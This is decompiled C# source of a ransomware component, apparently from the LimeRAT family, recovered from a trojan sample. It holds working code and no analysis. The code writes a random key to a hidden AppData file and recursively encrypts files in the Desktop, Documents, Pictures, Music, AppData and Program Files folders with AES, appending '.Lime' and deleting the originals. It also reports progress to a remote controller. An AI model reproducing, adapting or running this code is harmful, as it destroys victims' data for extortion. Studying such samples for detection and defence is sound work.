// Decompiled with JetBrains decompiler
// Type: Rware
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0B258E55-485E-43C4-A474-46A96B5CE129
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.Win32.Generic-882c2d397243c456fdefc25467864dfa71ad1d3ee215730381bd7370bba3721a.exe

using Lime;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

public class Rware
{
  private object ext;
  private string keycrypt;

  public Rware()
  {
    this.ext = (object) ".Lime";
    this.keycrypt = Conversions.ToString(this.RandomString((object) 50));
  }

  public void GenKey()
  {
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    if (!Directory.Exists(folderPath + "\\Microsoft\\MMC"))
      Directory.CreateDirectory(folderPath + "\\Microsoft\\MMC");
    File.WriteAllText(folderPath + "\\Microsoft\\MMC\\hash", this.keycrypt);
    this.Launch_crypt();
  }

  public object RandomString(object size)
  {
    string Expression = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnop";
    Random random = new Random();
    string str = "";
    int integer = Conversions.ToInteger(size);
    int num = 1;
    while (num <= integer)
    {
      int startIndex = random.Next(0, Strings.Len(Expression));
      str += Expression.Substring(startIndex, 1);
      checked { ++num; }
    }
    return (object) str;
  }

  public object Launch_crypt()
  {
    Core.Send("MSG" + Core.Y + "Ransomware: It might take some time, Please Wait..");
    this.Work_File(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\");
    this.Work_File(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\");
    this.Work_File(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\");
    Core.Send("MSG" + Core.Y + "Ransomware: %50 left...");
    this.Work_File(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\");
    this.Work_File(Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\\");
    this.Work_File(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\");
    Core.Send("MSG" + Core.Y + "Ransomware: %80 left...");
    this.Work_File(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\");
    this.Work_File(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\");
    this.Work_File(Environment.GetFolderPath(Environment.SpecialFolder.Recent) + "\\");
    File.Create(Path.GetTempPath() + "done.LE");
    Core.Send("MSG" + Core.Y + "Ransomware: All files have been encrypted");
    return (object) true;
  }

  public object Work_File(string MyPath)
  {
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string Right = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\desktop.ini";
    try
    {
      int num1 = checked (MyProject.Computer.FileSystem.GetFiles(MyPath).Count - 1);
      int index1 = 0;
      while (index1 <= num1)
      {
        if (Operators.CompareString(MyProject.Computer.FileSystem.GetFiles(MyPath)[index1], Application.ExecutablePath, false) != 0 & Operators.CompareString(MyProject.Computer.FileSystem.GetFiles(MyPath)[index1], folderPath + "\\Microsoft\\MMC\\hash", false) != 0 & Operators.CompareString(MyProject.Computer.FileSystem.GetFiles(MyPath)[index1], Right, false) != 0)
        {
          this.Crypt((object) MyProject.Computer.FileSystem.GetFiles(MyPath)[index1], (object) this.keycrypt);
          MyProject.Computer.FileSystem.DeleteFile(MyProject.Computer.FileSystem.GetFiles(MyPath)[index1]);
        }
        checked { ++index1; }
      }
      int num2 = checked (MyProject.Computer.FileSystem.GetDirectories(MyPath).Count - 1);
      int index2 = 0;
      while (index2 <= num2)
      {
        this.Work_File(MyProject.Computer.FileSystem.GetDirectories(MyPath)[index2]);
        checked { ++index2; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    string[] strArray;
    return (object) strArray;
  }

  public object Crypt(object file, object key)
  {
    byte[] input = File.ReadAllBytes(Conversions.ToString(file));
    File.WriteAllBytes(Conversions.ToString(Operators.AddObject(file, this.ext)), this.AES_Encrypt(input, Conversions.ToString(key)));
    object obj;
    return obj;
  }

  public byte[] AES_Encrypt(byte[] input, string pass)
  {
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
    byte[] numArray;
    try
    {
      byte[] destinationArray = new byte[32];
      byte[] hash = cryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
      Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
      Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
      rijndaelManaged.Key = destinationArray;
      rijndaelManaged.Mode = CipherMode.ECB;
      ICryptoTransform encryptor = rijndaelManaged.CreateEncryptor();
      byte[] inputBuffer = input;
      numArray = encryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return numArray;
  }
}
